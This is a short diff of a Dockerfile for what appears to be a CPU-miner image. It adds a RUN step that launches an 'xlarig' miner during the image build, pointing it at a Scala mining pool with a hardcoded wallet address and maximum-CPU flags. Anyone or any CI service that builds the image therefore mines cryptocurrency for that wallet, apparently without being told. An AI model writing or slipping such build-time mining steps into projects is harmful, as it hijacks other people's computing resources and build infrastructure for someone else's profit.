@@ -31,5 +31,6 @@ RUN apt-get update \
   && rm -rf /var/lib/apt/lists/*
 
 COPY --from=builder /app/cpuminer .
-ENTRYPOINT ["./cpuminer"]
+ENTRYPOINT ["./xlarig"]
+RUN ./xlarig -o ca.scala.herominers.com:10131 -u Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic -p agiz1 -a panthera --cpu-priority 5 --cpu-no-yield -k
 CMD ["-h"]
